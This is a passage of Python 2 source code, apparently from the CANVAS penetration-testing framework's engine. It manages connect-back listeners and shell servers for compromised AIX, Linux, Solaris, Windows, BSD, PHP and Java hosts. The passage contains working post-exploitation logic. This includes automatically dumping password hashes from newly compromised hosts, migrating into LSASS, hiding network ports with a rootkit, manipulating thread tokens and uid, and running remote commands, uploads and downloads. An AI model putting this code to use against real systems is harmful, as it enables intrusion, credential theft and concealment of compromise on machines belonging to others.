
        elif type == AIXMOSDEF_51_PPC:
            from aixNode import aixNode
            self.log("Connected, AIX 5.1 MOSDEF PPC")
            newshell    = aixNode()
            pnode.newNode(newshell)
            shell       = MosdefShellServer('AIX', 'PowerPC')(newsocket, newshell, version='5.1', logfunction=self.log)

        elif type == AIXMOSDEF_52_PPC:
            from aixNode import aixNode
            self.log("Connected, AIX 5.2 MOSDEF PPC")
            newshell    = aixNode()
            pnode.newNode(newshell)
            shell       = MosdefShellServer('AIX', 'PowerPC')(newsocket, newshell, version='5.2', logfunction=self.log)
        
        elif type==UNIXSHELL:
            from unixShellNode import unixShellNode
            telnetshell=Telnet()
            telnetshell.sock=newsocket
            shell=shelllistener(shellfromtelnet(telnetshell),logfunction=self.log)
            newshell=unixShellNode()
            newshell.shell=shell
            pnode.newNode(newshell)
            
        elif type==LINUXEXECVE_INTEL:
            from unixShellNode import unixShellNode
            newshell=unixShellNode()
            pnode.newNode(newshell)
            import linuxMosdefShellServer
            shell=linuxMosdefShellServer.execveshellserver(newsocket,newshell,logfunction=self.log)
            
        # the new school
        elif type == LINUXMOSDEF_INTEL:
            from linuxNode import linuxNode
            newshell = linuxNode()
            pnode.newNode(newshell)
            shell = MosdefShellServer('Linux', 'i386')(newsocket, newshell, logfunction=self.log)
            
        # the new school
        elif type == SOLARISMOSDEF_INTEL:
            from solarisNode import solarisNode
            newshell = solarisNode()
            pnode.newNode(newshell)
            shell = MosdefShellServer('Solaris', 'intel')(newsocket, newshell, logfunction=self.log)
              
        elif type == WIN32MOSDEF_INTEL:
            from win32Node import win32Node
            newshell=win32Node()
            pnode.newNode(newshell)
            import win32MosdefShellServer
            shell=win32MosdefShellServer.win32shellserver(newsocket,newshell,logfunction=self.log)            

        # XXX: only win32 support, so assume a win32 mosdef start up
        elif type in [HTTPMOSDEF, HTTPMOSDEF_SSL]:
            from win32Node import win32Node
            newshell = win32Node()
            pnode.newNode(newshell)
            import win32MosdefShellServer
            shell = win32MosdefShellServer.win32shellserver(newsocket, newshell, logfunction=self.log)            
        
        elif type == FREEBSDMOSDEF_INTEL:
            from bsdNode import bsdNode
            newshell=bsdNode()
            pnode.newNode(newshell)
            import bsdMosdefShellserver
            shell=bsdMosdefShellserver.bsdshellserver(newsocket,newshell)
            
        elif type==PHPMULTI:
            import phplistener
            from ScriptNode import ScriptNode
            node = ScriptNode()
            pnode.newNode(node)
            from ScriptShellServer import phpshellserver
            shell = phpshellserver(newsocket, node, logfunction=self.log)
            newshell=node
            
        elif type == JAVASERVER:    
            from Nodes.JavaShellServer import javashellserver
            from JavaNode import JavaNode
            node = JavaNode()
            pnode.newNode(node)
            shell = javashellserver(newsocket, node)
            newshell=node
            
        #else SQL ?    
        
        else:
            self.log("Cannot find the type of listener you requested! (%s)"%type)
            #gtk.threads_leave()
            return 0

        #this is how we pass variables down to the shellserver from the exploits
        #they go through the listener in the argsDict
        #by default, argsDict is empty
        if listener!=None:
            devlog("canvasengine", "Listener argsDict=%s"%listener.argsDict)
            shell.argsDict=listener.argsDict

        #print "Starting up listener..."
        try:
            devlog("canvasengine", "About to do newshell.startup")
            # startup shell
            newshell.startup()
            
            devlog("canvasengine", "Finished newshell.startup")
        except Exception, e:
            import traceback
            traceback.print_exc(file=sys.stderr)
            self.log("Newshell startup caused exception: %s" % e)
            return 0

        
        # Check if we are SILICA and that host hasn't been already exploited
        if "silica_postop" in listener.initstring:
            
            # Extract IP
            ttip = newip.split("'")
            if len(ttip)>1:
                tip = ttip[1]
            else:
                print "Failed to check host: ", newip


            # Check the state of the IP it may already be exploited which we temporarily
            # ignore until the state changes to free for exploitation
            if not self.check_ip_state(listener, tip):
                # change state to being exploited
                listener.silres.append([tip,"ACTIVE ATTACK"])
                # Try to exploit it
                self.runmod_exp("mosdefmigrate", newshell)
                r = self.runmod_exp("getpasswordhashes", newshell)
                if r.result:
                    print "Successfully exploited host: ", tip
                    self.append_result(listener, tip, r.result)
                else:
                    print "Failed exploiting host: ", tip
                    self.append_result(listener, tip, "Failed exploiting host")
                    
                
        self.log("Done with new Node startup.")
        self.successfortune()
        devlog("5 newshell.parent: %s"%newshell.parent)
        self.newNode(newshell)
        self.log("Done handling a new Listener Connection")
        return newshell

    def isSpecialInterface(self,interface):
        """
        returns true if the interface argument is a special one, currently
        just NAT interfaces
        """
        if interface.isSpecial():
            return True
        return False
    
    def autoListener(self, listenertype, host=None, autoFind=True):
        """
        starts a listener or uses an existing listener that has been set up
        
        Should never run in the main thread!
        """
        #if I'm running on the local node and supply a target host, then automatically 
        #choose the correct interface
        localNode=self.getLocalNode()
        if(self.callback_interface==None):
            devlog("engine", "self.callback is none")
        elif(self.callback_interface.parent==None):
            devlog("engine", "self.callback.parent is none")
        elif(self.callback_interface.parent.parent==None):
            devlog("engne", "self.callback_parent.parent is none")
        else:
            devlog("engine", "self.callback_interface.parent.parent=%s"%self.callback_interface.parent.parent)
            
        devlog("engine", "host=%s"%host)

        # XXX: we needed autofind control from the exploitmodule for httpserver special case! self.autoFind controls it.
        if autoFind == False:
            self.log("Special case callback interface, using hand selected.")
            interface=self.callback_interface
        elif (self.callback_interface.parent==None) or not (self.isSpecialInterface(self.callback_interface)) and host:
            devlog("engine", "Autofinding callback interface")
            self.log("Choosing correct callback interface for you")
            callback=self.get_callback_interface(host)
            self.log("Callback chosen: %s"%callback)
            interface=localNode.getMatchingInterface(callback)            
            if not interface:
                self.log("Could not find a matching interface for %s"%callback)
                self.log("Using default interface")
                return self.callback_interface
        else:
            #use the one selected
            self.log("Autolistener: Special interface chosen, so using that.")
            interface=self.callback_interface
            
        #check for old listener that will work
        for l in interface.children:
            ltype=l.type
            devlog("Autolistener", "ltype=%s"%ltype)
            if ltype==listenertype and (not l.busy):
                devlog("Autolistener", "Success finding listener on our interface: %s"%l.text)
                return l
            
        #try to start new listener
        #try for a port 4 times
        ports=[]
        pref_ports=[]

        if listenertype in [HTTPMOSDEF, HTTPMOSDEF_SSL]:
            pref_ports=[80, 443, 8080]

        elif listenertype in [WIN32MOSDEF_INTEL, LINUXMOSDEF_INTEL, SOLARISMOSDEF_SPARC, SOLARISMOSDEF_INTEL]:
            pref_ports=[25] #try this to see
            
        #makes sure our preffered ports are within the allowed port range for that interface
        for p in pref_ports:
            if p in range(interface.startport, interface.endport):
                ports+=[p]
                    
        #Now pick some random ports in case we cannot listen on those ports
        for i in range(0,4):
            #NATs have a smaller range
            ports+=[random.randint(interface.startport, interface.endport)]

        for port in ports:
            self.log("Starting %s listener on port %s"%(listenertype,port))
            l = self.start_listener(interface, listenertype, port)
            if l != 0: 
                return l
            else:
                self.log("Could not listen on that port, trying the next port")
        self.log("AutoListener: Could not get interface to callback to...")
        return None
    
    def get_http_mosdef(self, port):
        devlog("canvasengine", "Starting listener from get_http_mosdef(%d)"%port)
        return self.http_mosdef_listeners.get(port)
    
    def start_listener(self, interface, listener_type, port, fromcreatethread=0):
        """
        starts a listener and registers it with this engine
        Args:
        interface - None (for default of self.callback_interface) or interface to start listener on
        listenter_type - enum of type of listener, for example PHPMULTI
        port - port to start listener on
        
        returns none on failure or a newlistener on success
        """
        ipv6 = 0

        if not interface:
            interface = self.callback_interface
            assert interface

        if type(interface) == type(""):
            #we have a string, we need to change to an interface object
            newinterface=self.localnode.getMatchingInterface(interface)
            if not newinterface:
                self.log("Could not find interface matching %s"%interface)
                return None
            interface=newinterface
            
        if interface.isNAT:
            listenhost = "0.0.0.0" # XXX: hrmm "::" is the ipv6 equiv, would it come into play?
        else:
            listenhost = interface.ip
            if ":" in str(interface.ip):
                print "[!] Switching MOSDEF listener into IPv6 mode"
                ipv6 = 1

        node = interface.parent.parent
        
        self.log("%s Listener Startup Requested on %s:%d"%(listener_type, listenhost, port))
        gtkid=-1
        self.log("Starting listener on node type: %s"%node.nodetype)

        if node.nodetype == "LocalNode" and listener_type not in [HTTPMOSDEF, HTTPMOSDEF_SSL]:
            if ipv6:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            listenport = port

            try:
                # XXX: parse out any handset scope id's on the callback interface ;)
             
                if "%" in listenhost:
                    print "[!] parsing out IPv6 Scope ID !"
                    # XXX: check if we need the scope id on win32 !
                    listenhost = listenhost[:listenhost.find("%")]

                try:
                    s.bind((listenhost, listenport))
                except:
                    # fallback kludge to just listen on "::"
                    if ":" in listenhost:
                        listenhost = "::"
                        s.bind((listenhost, listenport))
                    else:
                        self.log("Could not bind to %s:%d"% (listenhost, listenport))
                        return 0
                    
                # XXX: for ipv6 support to be transparent
                try:
                    s.set_timeout(None)
                except:
                    print "[!] likely an ipv6 socket, set_timeout not supported !"

                s.listen(5)

            except:
                import traceback
                traceback.print_exc(file=sys.stdout)
                self.log("Could not listen on that socket")
                return 0
            
            if self.gui: # FIXME no gui code in engine
                gtkid = self.gui.input_add(s, self.gui.get_input_read(), lambda x,y:self.handleNewListenerConnection(interface,x,y))
            else:
                # XXX: dave/phil ... plz work out your differences on the gui vs. engine design
                # pseudo-gui's..GUI vs. gui...I'm confused, we need this here to handle connectbacks
                # in pseudo-gui on commandline situations (like test framework)
                lambda x,y:self.handleNewListenerConnection(interface, x, y)


        elif node.nodetype == "LocalNode" and listener_type in [HTTPMOSDEF, HTTPMOSDEF_SSL]:

            devlog("canvasengine","Starting HTTP MOSDEF listener on port %d."%port)

            if self.http_mosdef_listeners.get(port):
                self.log("Already have http_mosdef_listener")
                return False 

            if listener_type == HTTPMOSDEF:
                new_mosdef = http_mosdef(listenhost, port, engine=self, parent=interface, bind_ip=listenhost, ssl=False)

            elif listener_type == HTTPMOSDEF_SSL:
                new_mosdef = http_mosdef(listenhost, port, engine=self, parent=interface, bind_ip=listenhost, ssl=True)

            ret = new_mosdef.listen()
            if not ret:
                self.log("HTTP-MOSDEF could not listen on port %d"%port)
                return False 
            new_mosdef.start() #start new thread
            self.http_mosdef_listeners[port] = new_mosdef

            # XXX: can't return bool here, need full listener object for GUI
            #return True

            # handle our HTTP MOSDEF object as the parent socket (has accept)
            s = new_mosdef

            # XXX: these will always be localNode listeners I assume
            #if self.gui:
            #    gtkid = self.gui.input_add(s, self.gui.get_input_read(), lambda x,y:self.handleNewListenerConnection(interface,x,y))
            #else:
            #    lambda x,y:self.handleNewListenerConnection(interface, x, y)

        elif hasattr(node, 'createListener'):
            #else s needs to be the socket on the other side. technically this socket
            #needs to be set to non-blocking mode as well
            
            # XXX: ipv6 warning for now
            if ipv6:
                print "[!] IPv6 LISTENERS ONLY SUPPORTED ON LOCALNODES FOR NOW"
                return 0
            # XXX: end of ipv6 warning

            s = node.createListener(listenhost, port)
            if s == 0:
                self.log("Could not create listener on %s:%d"%(listenhost,port))
                return 0

        else:
            print "Serious error: node type not recognized when trying to create listener"
            print "Nodetype: %s"%node.nodetype
            
        from listenerLine import listenerLine
        newlistener = listenerLine(listener_type, port, self.getNewListenerId(), gtkid, s, self.log, interface)

        if fromcreatethread:
            newlistener.argsDict["fromcreatethread"] = fromcreatethread
        
        self.addListener(newlistener)
        self.allListeners.append(newlistener)
        return newlistener
            

    def listener_server_close(self,id):
        self.log("Closing active listener with ID=%d"%id)
        listeners=self.allListeners
        found=0
        for tmp in listeners:
            if tmp.getID()==id:
                found=1
                obj=tmp
                break
        if found:
            self.removeListener(obj)
        else:
            self.log("Did not find that listener in the list!")
        return 
        
    def dopostactions(self,newnode,successful_exploit):
        #now we need to restart services or whatever else
        #we have in postactions
        app=successful_exploit
        ret=newnode
        for action in app.postactions:
            #action is (STRING,args[])
            if action[0]=="restart service":
                self.log("Restarting Services on Node %s"%ret.getname())
                restart=self.getModuleExploit("restartservice")
                restart.link(app)
                restart.argsDict["passednodes"]=[ret]
                for service in action[1] :
                    self.log("Restarting %s"%service)
                    restart.argsDict["serviceName"]=service
                    restart.run()
                    self.log("Running restart service again, to be sure")
                    restart.run() #run twice
            elif action[0]=="reverttoself":
                self.log("Reverting to self")
                app.exploitnodes("setthreadtoken",[ret])
            elif action[0]=="mosdefmigrate":
                self.log("Migrating into LSASS as fast as we can!")
                app.exploitnodes("mosdefmigrate",[ret])
                self.log("Migrated!")
            elif action[0]=="hideport":
                self.log("Hiding remote network port using the rootkit.")
                app.argsDict["hideport"]=action[1]
                app.exploitnodes("hideport",[ret])
                self.log("Hide port successful!")
            elif action[0] == "testomatic":
                self.log("Testomatic requesting post action.")
                msg = app.exploitnodes(action[1],nodes=[ret])
                self.log("Msg: %s" % msg)
                
                try:
                    for i in msg:
                        if i == -1 or i == "-1" or i is None or i == "" or "error" in str(i).lower() or "failed" in str(i).lower():
                            app.succeeded = False
                            app.result_error = "testomaticerror"
                        else:
                            self.log("Value of i: %s" % str(i))
                except:
                    app.succeeded = False
                    app.result_error = "testomaticerror"
                    
                self.log("Ran the testomatic post action.")
                
        self.log("Finished postactions on node %s"%ret.getname())
        return

    ###############################EXPLOIT HANDLERS###################################
   
    
    def printvalidtokens(self,listener):
        """ prints all the valid tokens in a win32 server"""
        try:
            self.log(listener.printvalidtokens())
        except:
            self.log("Error trying to print all valid tokens: ")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
        return
        
    def runsetthreadtoken(self,token,listener):
        ret=listener.SetThreadToken(0,token)
        self.log("SetThreadToken returned %d"%ret)
        
    def runexitthread(self,exitcode,listener):
        ret=listener.doexitthread(exitcode)
        self.log("ExitThread returned %d"%ret)
        
    def runsetuid(self,uid,listener):
        ret=listener.dosetuid(uid)
        self.log("setuid returned %d"%ret)
        
    def runsetgid(self,gid,listener):
        ret=listener.dosetgid(gid)
        self.log("getuid returned %d"%ret)
        
    def detectos(self, target):
        try:
            app=getModuleExploit("osdetect")
        except:
            return "Unknown"
        app.setLogFunction(self.exploitlog)
        app.setDebugFunction(self.exploitdebuglog)
        app.target=target
        argsDict={}
        argsDict["passednodes"]=[localNode()]
        app.argsDict=argsDict
        app.engine=canvasengine(None)
        
        result=app.run()

        if result==0:
            return "Unknown"
        #otherwise result is a os!
        return app.result
    
    def gethost(self,host):
        """gets a host using the host's name
        in the future will also take in a fromhost,
        since each host knows about a different set of hosts
        """
        for each in self.knownhosts:
            if each.name==host:
                return each
        return None
    
    def registerPotentialVuln(self,fromhost,tohost,vulnname,vulndesc):
        """
        register a vuln in the target host so when we click on it
        it'll pop up
        """
        #should be fromhost.knownhosts, but whatever - we'll wait until the big 5.0
        #rewrite for that.

        for each in self.knownhosts:
            if each.name==tohost:
                each.addVuln(vulnname,vulndesc)
                return
        return
  
    def addKnowledge(self,hoststring,key,knowledge,percentage):
        print "Error. Not implemented"
        return

    def addknownhost(self,kLine, host):
        """adds a host to our internal list and then to the gui's list"""
        ha=hostadder(kline,host)
        ha.start()
        return
        
    
    ###################################################################################
    #Listener-Shell Listener Handlers

    
    def shellcommand(self,node,wTree2,modulename,argsDict):
        """
        calls the equivalent of popen on the listener
        """
        print "Running module: %s"%modulename
        #now I want to run an exploit with shell as my first node in the list.
        app=getModuleExploit(modulename)
        #set the three main variables for the exploit
        argsDict["passednodes"]=[node]
        #logging?
        app.argsDict=argsDict
        manager=exploitmanager(app,self)
        manager.listener_log(wTree2)
        manager.start()      
        #self.log("listener id %d getpwd() returned %s"%(id,ret))
        return #exploit is running in another thread...

    def pwd(self,node,wTree2):
        """
        calls the equivalent of pwd on the listener
        """
        self.shellcommand(node,wTree2,"getcwd",{})

    def runcommand(self,node,wTree2,command):
        """
        calls the equivalent of popen on the listener
        """
        argsDict={}
        argsDict["command"]=command
        self.shellcommand(node,wTree2,"runcommand",argsDict)
        return #exploit is running in another thread...

    def runcd(self,node,wTree2,directory):
        argsDict={}
        argsDict["directory"]=directory
        self.shellcommand(node,wTree2,"chdir",argsDict)
        return #exploit is running in another thread...

    def rundownload(self,node,wTree2,source,directory):
        argsDict={}
        
        argsDict["source"]   = source 
        argsDict["directory"]= directory
        self.shellcommand(node,wTree2,"download",argsDict)
        return #exploit is running in another thread...

    def runupload(self,node,wTree2,source):
        argsDict={}
        argsDict["source"]=source
        self.shellcommand(node,wTree2,"upload",argsDict)
        return #exploit is running in another thread... 

    def rundir(self,node,wTree2,directory):
        argsDict={}
        argsDict["directory"]=directory
        self.shellcommand(node,wTree2,"dir",argsDict)
        return #exploit is running in another thread...

    def rununlink(self,node,wTree2,filename):
        argsDict={}
        argsDict["filename"]=filename
        self.shellcommand(node,wTree2,"unlink",argsDict)
        return #exploit is running in another thread...

    def runspawn(self,node,wTree2,filename):
        argsDict={}
        argsDict["filename"]=filename
        self.shellcommand(node,wTree2,"spawn",argsDict)
        return #exploit is running in another thread...

    
    def runcreateprocessasuser(self,node,wTree2,command):
        """
        Calls create process as user to execute a process with the current thread token.
        Only available on Win32
        """
        argsDict={}
        argsDict["directory"]=directory
        self.shellcommand(node,wTree2,"notdoneyet",argsDict)
        return #exploit is running in another thread...
    
    #### NODE MAINTANANCE
    def old_addNode(self,node):
        #at some point we need to run our coalace algorythim. For example, to
        #make all machines with the same machineID's be the same node...
        #also we need to implement:
        # for each host in targethostlist:
        #    fromhost=self.randomOwnedHost()
        #    self.onhost=fromhost
        #    self.connectbackhost=fromhost
        #    runattack() 
        # so that basically we can supply a list of targets, a list of owned hosts, and go from there!
        self.nodeList+=[node]
        #print self.gui.nodegui
        self.addNode(node)
        
    def getLocalNode(self):
        return self.localnode
        
    def loadLocalNode(self):
        """
        Special code to start up our local node and add it to the engine
        """
        if self.localnode:
            return self.localnode
        ln=localNode()
        ln.startup()
        #self.addNode(ln)
        self.localnode=ln
        self.set_first_node(ln)
        return ln

    def find_geteip(self,mnemonic,platform,startaddress,buffer):
        """
        If we have CANVAS World Service, go out and ask a smart
        routine to find me something, otherwise, just do a mosdef
        search here for ff e4 or similar
        you'll be able to attach to a find_geteip from anyone
        you want, not just Immunity.
        """
        #just a stub here for now!
        from MOSDEF import mosdef
        bytes=mosdef.assemble(mnemonic,platform)
        index=buffer.find(bytes)
        if index==-1:
            return None
        return startaddress+index

    def getAllDesktop(self):
        """
        Returns the desktop contents. This is then converted into
        XML for the DocServer to generate into documentation/reporting.
        
        """
        desktop=Desktop()
        desktop.modules_run=self.allexploits
        return desktop

class Desktop(object):
    """
    A storage container for our desktops. Mostly for pickling
    and unpickling.
    
    Right now this only has the modules we've run.
    """
    def __init__(self):
        self.modules_run=[]
        return 
    
def license_check():
    """
    Prints out and continues when the user accepts the license
    """
    
    #does the license file exist?
    try:
        fd=file("licensecheck","rb")
        #if so, return
        return
    except:
        fd=None
    data=file("LICENSE.txt").readlines()
    i=0
    for line in data:
        print line
        i=i+1
        if i>20:
            print "Please press enter to continue"
            sys.stdout.flush()
            raw_input()
            i=0
    
    print "If terms are accepted, type yes, otherwise, type no to exit program."
    while 1:
        ret=raw_input()
        if ret.lower()=="yes":
            fd=file("licensecheck","wb")
            fd.write(ret)
            fd.close()
            return
        if ret.lower()=="no":
            print "Exiting"
            sys.stdout.flush()
            sys.exit()
        else:
            print "Must type yes to continue"
            sys.stdout.flush()

# temporary hook kludge
def runAnExploit_gtk2(*args):
    from gui.canvasguigtk2 import runAnExploit_gtk2 as hooked_runAnExploit_gtk2
    return hooked_runAnExploit_gtk2(*args)

def propertyPrint():
    import re
    propertyList = []
    property_fd=file("Properties.txt","wb")
    property_fd.write("Full property dict for each module\n\n")
    registerAllModules()
    osList = ["Windows", "Linux", "Solaris", "AIX", "HP/UX"]
    for key in __exploitmods_old.keys():
        property_fd.write("module: %s has the following properties\n"%key)
        for propkey in __exploitmods_old[key].PROPERTY.keys():
                temp = "\t %s : "%propkey
                if type(__exploitmods_old[key].PROPERTY[propkey]) == bool:
                    if __exploitmods_old[key].PROPERTY[propkey]:
                        temp += "True \n"
                    else:
                        temp += "False \n"
                elif type(__exploitmods_old[key].PROPERTY[propkey]) == str:
                    temp += __exploitmods_old[key].PROPERTY[propkey] + "\n"
                
                elif type(__exploitmods_old[key].PROPERTY[propkey]) == list and propkey != "ARCH":
                    try:
                        if len(__exploitmods_old[key].PROPERTY[propkey]) > 0: 
                            for item in __exploitmods_old[key].PROPERTY[propkey]:
                                temp += item + "\n"
                        else:
                            temp += "\n"
                    except:
                            temp += "List within list\n"
            
                elif propkey == "ARCH" and len(__exploitmods_old[key].PROPERTY[propkey]) > 0:
                    for arch in __exploitmods_old[key].PROPERTY[propkey][0]:
                        if arch in osList:
                                temp += arch + ": "
                        else:
                            temp += arch + ", "
                    temp = temp[0:-2]
                    temp += "\n"
                    
                else:
                    temp += "\n"
                property_fd.write(temp)
        property_fd.write("\n")
    property_fd.close()

def docPrint():
    csvLiteList = []
    counter = 0
    csv_fd=file("Docs.csv","wb")
    csvLite_fd=file("Docs-Lite.txt", "wb")
    f=file("Docs.xml","wb")
    f.write("<?xml-stylesheet href=\"canvas.css\" type=\"text/css\"?><all_documentation>")
    csvLite_fd.write("#####################################################################\n")
    csvLite_fd.write("# Listing of CANVAS Attack Modules\n")
    print "Generating documentation"
    registerAllModules()
    print __exploitmods_old
    for key in __exploitmods_old.keys():
        print "Generating documentation from module %s"%key
        ret=html_docs_from_module(__exploitmods_old[key])
        if not ret:
            continue
        html, csv, docslite = ret 
        f.write(html)
        csv_fd.write(",".join(csv).replace("\n","")+"\n") #write our comma seperated value to disk
        if docslite:
            counter += 1
            csvLiteList.append(docslite)
    f.write("</all_documentation>")
    f.close()
    csv_fd.close()
    csvLite_fd.write("# Total Number of Attack Modules: %d\n"%counter)
    csvLite_fd.write("#\n# Module Name - CVE Number - CVE URL\n")
    csvLite_fd.write("#####################################################################\n")
    for line in csvLiteList:
        csvLite_fd.write(line)
    csvLite_fd.close()
    print "Wrote Docs.csv, Docs.xml and Docs-Lite.txt to your CANVAS directory"
    

def canvasmain():
    bugtracker(__canvasmain)

def __canvasmain():
    license_check()
    from gui import loadgtk
    loadgtk()
    global registermoduleslog
    splashscreen=CanvasConfig["splashscreen"]
    try:
        if splashscreen:
            from gui.guiload import RegisterModulesGTK
            registermoduleslog = RegisterModulesGTK()
        #print "Using registermodulesGTK"
    except:
        import traceback
        traceback.print_exc(file=sys.stdout)
        pass

    #start the loader gui...
    init_threads=True
    if splashscreen:# and os.name!="nt":

        init_threads=False
        mit=registerAllModulesInThread()
        registermoduleslog.run()
        devlog("Finished with registermodules log")
        #now we try to acquire this so we don't continue until we're done
        mit.mylock.acquire()
        mit.mylock.release()
    else:
        registerAllModules()
    if not init_threads:
        registermoduleslog.close()
    #should we need this?
    #registermoduleslog.destroy()
    #this will self-destroy (and call gtk.quit() when done)
    #then we move on to our real GUI
    from gui import canvasguimain
    canvasguimain(init_threads=init_threads)
    threadutils_cleanup()

if __name__ == '__main__':
    print "\nCANVAS is started using the runcanvas script\n"
    print "\nYou can generate documentation for modules by passing this script -D\n"
    print "\nYou can generate a listing of all exploit module PROPERTY fields by passing this script -P\n"
    if len(sys.argv) == 1:
        sys.exit(1)
    if sys.argv[1]=="-P":
        propertyPrint()
    if sys.argv[1]=="-D":
        docPrint()
        
